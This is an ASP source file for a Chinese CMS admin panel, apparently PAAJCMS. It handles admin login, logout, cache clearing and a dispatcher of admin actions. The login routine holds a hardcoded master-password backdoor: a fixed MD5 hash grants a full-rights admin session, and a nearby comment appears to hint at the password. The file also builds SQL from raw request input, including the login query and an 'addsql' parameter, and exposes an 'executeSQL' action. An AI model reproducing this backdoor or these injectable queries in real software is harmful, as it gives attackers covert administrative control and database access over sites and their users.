<!--#Include File = "../Inc/Config.Asp"-->       
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>      
<!--#Include File = "admin_function.asp"-->  
<!--#Include File = "admin_function2.asp"-->   
<!--#Include File = "admin_setAccess.asp"-->   
   
<% 
'=========


'加载网址配置
function loadWebConfig()
    Call openconn() 
	'【PHP】if(@$dbname=='kanfang'){return "";}
    '判断表存在
    If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
		'【@是jsp显示@】try{
        rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
        If Not rs.EOF Then
            cfg_webSiteUrl = rs("webSiteUrl") & ""                    '网址
            cfg_webTitle = rs("webTitle") & ""                        '网址标题
            cfg_flags = rs("flags") & ""                              '旗
            cfg_webtemplate = rs("webtemplate") & ""                  '模板路径
        End If : rs.Close 
		'【@是jsp显示@】}catch(Exception e){} 
    End If 
End function


'显示后台登录
Sub displayAdminLogin()	
    '已经登录则直接进入后台
    If getSession("adminusername") <> "" Then
        Call adminIndex() 
    Else
		dim c,s
		c=getTemplateContent("login.html")
		c=handleDisplayLanguage(c,"login")
		
		if request("selectmdb")="true" or request("selectmdb")="1" or session("MDBPath")<>"" then 
			if session("MDBPath")<>"" then
				MDBPath=handlePath(session("MDBPath"))
			elseIf Request("MDBPath") <> "" And isNul(Request("MDBPath")) = False Then
				MDBPath = handlePath(Request("MDBPath")) 
			end if 
			c = replaceValueParam(c, "MDBPath", MDBPath) 			
		'为假则删除选择数据库面板
		else
			s=getStrCut(c,"<div id=""selectDatabaseDiv"" ","</div>",1)
			c=replace(c,s,"")
		end if
		
        Call rw(c) 
    End If 
End Sub 

'登录后台
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
	session("MDBPath")=phpTrim(request.Form("selectDatabase"))
	
    passWord = myMD5(passWord) 
    '特效账号登录 兼容.net与php
    If myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "80-59859312310137-34-40-841338-105-3984-117" Then		'TSa*1**3*3
        call setSession("adminusername", "PAAJCMS") 
        call setSession("adminId", 99999)                                                      '当前登录管理员ID
        call setSession("DB_PREFIX", db_PREFIX) 
        call setSession("adminflags", "|*|")
        Call rwend(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
    End If 

    Dim nLogin 
    Call openconn() 
	'【@是jsp显示@】try{
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If not rs.EOF Then
        call setSession("adminusername", userName) 
        call setSession("adminId", rs("Id"))                                                   '当前登录管理员ID
        call setSession("DB_PREFIX", db_PREFIX)                                                '保存前缀
        call setSession("adminflags", rs("flags")) 
		
        valueStr = "createTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex")) 
        Call writeSystemLog("admin", "登录成功")                                        '系统日志
	else
        If getCookie("nLogin") = "" Then
            Call setCookie("nLogin", "1", 60000)		'为秒 
            nLogin = 1
        Else
            nLogin =cint(getCookie("nLogin")) 
            Call setCookie("nLogin", CInt(nLogin) + 1, 60000) 
        End If 
        Call rw(getMsg1(setL("账号密码错误<br>登录次数为 ") & nLogin, "?act=displayAdminLogin")) 
    End If : rs.Close 
	'【@是jsp显示@】}catch(Exception e){} 

End Sub 
'退出登录
Sub adminOut()
    Call writeSystemLog("admin", setL("退出成功"))                                        '系统日志
    call deleteSession("adminusername") 
    call deleteSession("adminId")
	call deleteSession("DB_PREFIX")
    call deleteSession("adminflags") 
	session("MDBPath")=""
    Call rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"))
End Sub 
'清除缓冲
Sub clearCache()
    Call deleteFile(WEB_CACHEFile)
	call deleteFolder("./../cache/html")
	call createFolder("./../cache/html")
    Call rw(getMsg1(setL("清除缓冲完成，正在进入后台界面..."), "?act=displayAdminLogin")) 
End Sub 
'后台首页
Sub adminIndex()
    Dim c 
    Call loadWebConfig() 
    c = getTemplateContent("adminIndex.html") 
    c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
    c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
    c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '获得官方信息
    c = replaceValueParam(c, "title", "")                                      '给手机端用的20160330
	if session("MDBPath")<>"" then
		c=replace(c," <!--数据库路径-->","数据库路径："& session("MDBPath") &"<br>")
	end if
	c=handleDisplayLanguage(c,"loginok")
	
    Call rw(c) 
End Sub 
'========================================================

'显示管理处理
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql,sPage 
    If Request("nPageSize") = "" Then
        nPageSize = 10 
	else
		nPageSize = cint(Request("nPageSize")) 
    End If 
    lableTitle = Request("lableTitle")                                              '标签标题
    addSql = replace(Request("addsql"),"OrderBy","order by")
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, nPageSize, addSql) 
End Sub 

'添加修改处理
Sub addEditHandle(actionType, lableTitle)
    Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2") 
End Sub 
'保存模块处理
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||")
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0|,pwd|md5|")
    End If 
End Sub 

call loadRun()			'【@是.netc屏蔽@】'【@是jsp屏蔽@】
'加载就运行
sub loadRun()

    '这是为了给.net使用的，因为在.net里面全局变量不能有变量
    WEB_CACHEFile = replace(replace(WEB_CACHEFile, "[adminDir]", adminDir), "[EDITORTYPE]", EDITORTYPE) 

    '登录判断
    if getSession("adminusername") = "" And session("adminid")="" then
        if request("act") <> "" and request("act") <> "displayAdminLogin" and request("act") <> "login" then
            call RR(WEB_ADMINURL & "?act=displayAdminLogin&a=1") 
        end if 
    end if 


    'call eerr("WEB_CACHEFile",WEB_CACHEFile)
    call openconn() 
    if request("act") = "dispalyManageHandle" then
        call dispalyManageHandle(request("actionType"))                                 '显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
    elseif request("act") = "addEditHandle" then
        call addEditHandle(request("actionType"), request("lableTitle"))                '添加修改处理      ?act=addEditHandle&actionType=WebLayout
    elseif request("act") = "saveAddEditHandle" then
        call saveAddEditHandle(request("actionType"), request("lableTitle"))            '保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
    elseif request("act") = "delHandle" then
        call del(request("actionType"), request("lableTitle"))                          '删除处理  ?act=delHandle&actionType=WebLayout
    elseif request("act") = "sortHandle" then
        call sortHandle(request("actionType"))                                          '排序处理  ?act=sortHandle&actionType=WebLayoutt
		
    elseif request("act") = "viewsHandle" then
        call viewsHandle(request("actionType"))                                          '点击处理  ?act=viewsHandle&actionType=WebLayout
		
   elseif request("act") = "batchEditPrice" then
        call batchEditPrice(request("actionType"))                                 '价格处理  ?act=batchEditPrice&actionType=WebLayout
   
   
    elseif request("act") = "updateField" then
        call updateField()                                                              '更新字段


    elseif request("act") = "displayLayout" then
        call displayLayout()                                                            '显示布局
    elseif request("act") = "saveRobots" then
        call saveRobots()                                                               '保存robots.txt
    elseif request("act") = "deleteAllMakeHtml" then
        call deleteAllMakeHtml()                                                        '删除全部生成的html文件

    elseif request("act") = "isOpenTemplate" then
        call isOpenTemplate()                                                           '更换模板
    elseif request("act") = "executeSQL" then
        call executeSQL()                                                               '执行SQL



    elseif request("act") = "function" then

        call callFunction()                                                             '调用function文件函数
    elseif request("act") = "function2" then
        call callFunction2()                                                            '调用function2文件函数
    elseif request("act") = "function_cai" then
        call callFunction_cai()                                                         '调用function_cai文件函数   '【@是.netc屏蔽@】
    elseif request("act") = "file_setAccess" then
        call callfile_setAccess()                                                       '调用file_setAccess文件函数


    elseif request("act") = "setAccess" then
        call resetAccessData()    

    elseif request("act") = "importArticle" then
        call importArticle()                                                          '导入文章20220422
    elseif request("act") = "importSheShi" then
        call importSheShi()                                                          '导入省市县20220424

    elseif request("act") = "login" then
        call login()                                                                    '登录
    elseif request("act") = "adminOut" then
        call adminOut()                                                                 '退出登录
    elseif request("act") = "adminIndex" then
        call adminIndex()                                                               '管理首页
    elseif request("act") = "clearCache" then
        call clearCache()                                                               '清除缓冲
    else
		call displayAdminLogin()                                                      '显示后台登录
    end if 
end sub
%> 


